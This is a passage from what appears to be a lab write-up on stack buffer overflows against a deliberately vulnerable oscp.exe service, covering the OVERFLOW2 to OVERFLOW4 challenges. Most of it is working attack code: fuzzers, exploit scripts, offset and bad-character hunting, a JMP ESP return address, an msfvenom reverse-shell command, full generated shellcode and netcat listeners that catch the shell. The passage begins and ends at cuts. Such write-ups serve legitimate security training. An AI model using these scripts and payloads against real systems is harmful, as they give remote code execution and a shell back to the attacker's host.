	payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A"
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

On kail run the exploit again then in mona run the following to get the offset for EIP. We were able to find the offset was 634.

**Kali**

```
python exploit.py $VICTIM 1337
```

**Immunity Debugger**

```
!mona findmsp -distance 700
```

<figure><img src="../../.gitbook/assets/image (17) (2) (1).png" alt=""><figcaption></figcaption></figure>

**exploit.py - Code Changes #2**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW2 "
	offset = 634
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = ""
	#payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A"
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali**

After running the program again we now can fill EIP with our Bs so we now have control of EIP.

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (10) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

### Finding Bad Characters

**Kali**

Now we changed the program to look for bad characters so we don't later use those bad characters when generating our payload. We do this by setting our payload to all possible characters, than follow EIP to see which characters aren't showing up. To do this we just have to keep running our exploit and removing the bad characters one by one. The bad characters found were: \x00\x23\x3c\x83\xba

```
python exploit.py $VICTIM 1337
```

#### **exploit.py - Code Changes #3**

```
import socket, time, sys

#badchars found: \x00\x23\x3c\x83\xba
badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW2 "
	offset = 634
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = badchars
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

<figure><img src="../../.gitbook/assets/image (51) (1).png" alt=""><figcaption></figcaption></figure>

### Finding a Jump Point

Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with  SafeSEH, ASLR, and NXCompat disabled and the  memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. essfunc.dll at 0x62500000 meets this criteria.&#x20;

**Immunity Debugger**

```
!mona modules
```

<figure><img src="../../.gitbook/assets/image (43) (2).png" alt=""><figcaption></figcaption></figure>

We find that essfunc.dll has 9 possible JMP ESPs to use. So we will start with the first one which is 0x625011af but when we add it to our code we need it in little endian format so it becomes \xaf\x11\x50\x62.

**Immunity Debugger**

```
!mona find -s "\xff\xe4" -m essfunc.dll
```

<figure><img src="../../.gitbook/assets/image (34) (2).png" alt=""><figcaption></figcaption></figure>

### Exploit

Now that we have the return address to use, we just need to generate our payload without using the bad characters found previously. I also added 16 NOPs before the payload as suggested in the room. All that is left is to is to update our code with our payload and run it against the program.

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f c 
```

#### **exploit.py - Code Changes #4**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW2 "
	offset = 634
	overflow = "A" * offset
	retn = "\xaf\x11\x50\x62"
	padding = "\x90" * 16
	payload = ("\xfc\xbb\xc2\x95\xaf\x8c\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x3e\x7d\x2d\x8c\xbe"
"\x7e\x52\x04\x5b\x4f\x52\x72\x28\xe0\x62\xf0\x7c\x0d\x08\x54"
"\x94\x86\x7c\x71\x9b\x2f\xca\xa7\x92\xb0\x67\x9b\xb5\x32\x7a"
"\xc8\x15\x0a\xb5\x1d\x54\x4b\xa8\xec\x04\x04\xa6\x43\xb8\x21"
"\xf2\x5f\x33\x79\x12\xd8\xa0\xca\x15\xc9\x77\x40\x4c\xc9\x76"
"\x85\xe4\x40\x60\xca\xc1\x1b\x1b\x38\xbd\x9d\xcd\x70\x3e\x31"
"\x30\xbd\xcd\x4b\x75\x7a\x2e\x3e\x8f\x78\xd3\x39\x54\x02\x0f"
"\xcf\x4e\xa4\xc4\x77\xaa\x54\x08\xe1\x39\x5a\xe5\x65\x65\x7f"
"\xf8\xaa\x1e\x7b\x71\x4d\xf0\x0d\xc1\x6a\xd4\x56\x91\x13\x4d"
"\x33\x74\x2b\x8d\x9c\x29\x89\xc6\x31\x3d\xa0\x85\x5d\xf2\x89"
"\x35\x9e\x9c\x9a\x46\xac\x03\x31\xc0\x9c\xcc\x9f\x17\xe2\xe6"
"\x58\x87\x1d\x09\x99\x8e\xd9\x5d\xc9\xb8\xc8\xdd\x82\x38\xf4"
"\x0b\x04\x68\x5a\xe4\xe5\xd8\x1a\x54\x8e\x32\x95\x8b\xae\x3d"
"\x7f\xa4\x45\xc4\xe8\xc1\x93\x29\x65\xbd\xa1\xb5\x67\x62\x2f"
"\x53\xed\x8a\x79\xcc\x9a\x33\x20\x86\x3b\xbb\xfe\xe3\x7c\x37"
"\x0d\x14\x32\xb0\x78\x06\xa3\x30\x37\x74\x62\x4e\xed\x10\xe8"
"\xdd\x6a\xe0\x67\xfe\x24\xb7\x20\x30\x3d\x5d\xdd\x6b\x97\x43"
"\x1c\xed\xd0\xc7\xfb\xce\xdf\xc6\x8e\x6b\xc4\xd8\x56\x73\x40"
"\x8c\x06\x22\x1e\x7a\xe1\x9c\xd0\xd4\xbb\x73\xbb\xb0\x3a\xb8"
"\x7c\xc6\x42\x95\x0a\x26\xf2\x40\x4b\x59\x3b\x05\x5b\x22\x21"
"\xb5\xa4\xf9\xe1\xd5\x46\x2b\x1c\x7e\xdf\xbe\x9d\xe3\xe0\x15"
"\xe1\x1d\x63\x9f\x9a\xd9\x7b\xea\x9f\xa6\x3b\x07\xd2\xb7\xa9"
"\x27\x41\xb7\xfb\x27\x65\x47\x04")
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali #1**

```
nc -lvnp 4444
```

**Kali #2**

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (28) (2) (1).png" alt=""><figcaption></figcaption></figure>

## oscp.exe - OVERFLOW3

#### fuzzer.py

Slightly modified version of the script given.

```
#!/usr/bin/env python3

import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))
	timeout = 5
	prefix = "OVERFLOW3 "
	string = prefix + "A" * 100

	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.settimeout(timeout)
				s.connect((ip, port))
				s.recv(1024)
				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string, "latin-1"))
				s.recv(1024)
		except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			sys.exit(0)
		string += 100 * "A"
		time.sleep(1)

except:
    print ("\nCould not connect!")
    sys.exit()

```

**exploit.py**

Slightly modified version of the script given.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW3 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = ""
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali**

Login the the Windows box then open the oscp.exe within Immunity Debugger. Press the play button to start the program.

```
xfreerdp /u:admin /p:password /cert:ignore /v:$VICTIM /workarea
```

### **Crash Replication & Controlling EIP**

```
python fuzzer.py $VICTIM 1337
```

Program crashed at 1300 bytes with fuzzer.py



<figure><img src="../../.gitbook/assets/image (56) (1).png" alt=""><figcaption></figcaption></figure>

```
/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 1300
```

#### **exploit.py - Code Changes #1**

I added the pattern\_create output into the payload variable.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW3 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2B"
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

On kail run the exploit again then in mona run the following to get the offset for EIP. We were able to find the offset was 1274.

**Kali**

```
python exploit.py $VICTIM 1337
```

**Immunity Debugger**

```
!mona findmsp -distance 1300
```

<figure><img src="../../.gitbook/assets/image (51) (2).png" alt=""><figcaption></figcaption></figure>

**exploit.py - Code Changes #2**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW3 "
	offset = 1274
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = ""
	#payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2B"
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali**

After running the program again we now can fill EIP with our Bs so we now have control of EIP.

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (54) (1).png" alt=""><figcaption></figcaption></figure>

### Finding Bad Characters

**Kali**

Now we changed the program to look for bad characters so we don't later use those bad characters when generating our payload. We do this by setting our payload to all possible characters, than follow EIP to see which characters aren't showing up. To do this we just have to keep running our exploit and removing the bad characters one by one. The bad characters found were: \x00\x11\x40\x5f\xb8\xee

```
python exploit.py $VICTIM 1337
```

#### **exploit.py - Code Changes #3**

```
import socket, time, sys

#badChars found: \x00\x11\x40\x5f\xb8\xee
badChars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW3 "
	offset = 1274
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = badChars
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

<figure><img src="../../.gitbook/assets/image (53) (1).png" alt=""><figcaption></figcaption></figure>

### Finding a Jump Point

Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with  SafeSEH, ASLR, and NXCompat disabled and the  memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. essfunc.dll at 0x62500000 meets this criteria.&#x20;

**Immunity Debugger**

```
!mona modules
```

<figure><img src="../../.gitbook/assets/image (59) (1).png" alt=""><figcaption></figcaption></figure>

We find that essfunc.dll has 9 possible JMP ESPs to use. I started with the first one but later found out that it does not work, neither did most of the other ones. When I was ready to have my listener running to catch a shell nothing was returned. I decided to go down this list until I found one that had enough space for our payload. The one that worked was 0x62501203 but when we add it to our code we need it in little endian format so it becomes \x03\x12\x50\x62. We could have also tried with a smaller payload if none of the JMP ESPs worked.

**Immunity Debugger**

```
!mona find -s "\xff\xe4" -m essfunc.dll
```

<figure><img src="../../.gitbook/assets/image (57) (1).png" alt=""><figcaption></figcaption></figure>

### Exploit

Now that we have the return address to use, we just need to generate our payload without using the bad characters found previously. I also added 16 NOPs before the payload as suggested in the room. All that is left is to is to update our code with our payload and run it against the program.&#x20;

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00\x11\x40\x5f\xb8\xee" -f c 
```

#### **exploit.py - Code Changes #4**

```
// Some code
```

**Kali #1**

```
nc -lvnp 4444
```

**Kali #2**

```
python exploit.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (58) (1).png" alt=""><figcaption></figcaption></figure>

## oscp.exe - OVERFLOW4

#### fuzzer.py

Slightly modified version of the script given.

```
#!/usr/bin/env python3

import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))
	timeout = 5
	prefix = "OVERFLOW4 "
	string = prefix + "A" * 100

	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.settimeout(timeout)
				s.connect((ip, port))
				s.recv(1024)
				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string, "latin-1"))
				s.recv(1024)
		except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			sys.exit(0)
		string += 100 * "A"
		time.sleep(1)

except:
    print ("\nCould not connect!")
    sys.exit()

```



#### exploit.py

Slightly modified version of the script given.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW4 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
	payload = ""
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali**

Login the the Windows box then open the oscp.exe within Immunity Debugger. Press the play button to start the program.

```
xfreerdp /u:admin /p:password /cert:ignore /v:$VICTIM /workarea
```

### **Crash Replication & Controlling EIP**

```
python fuzzer.py $VICTIM 1337
```

Program crashed at 2100 bytes with fuzzer.py

<figure><img src="../../.gitbook/assets/image (17) (1) (2).png" alt=""><figcaption></figcaption></figure>

```
/opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 2100
```

#### **exploit.py - Code Changes #1**

I added the pattern\_create output into the payload variable.

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = "OVERFLOW4 "
	offset = 0
	overflow = "A" * offset
	retn = ""
	padding = ""
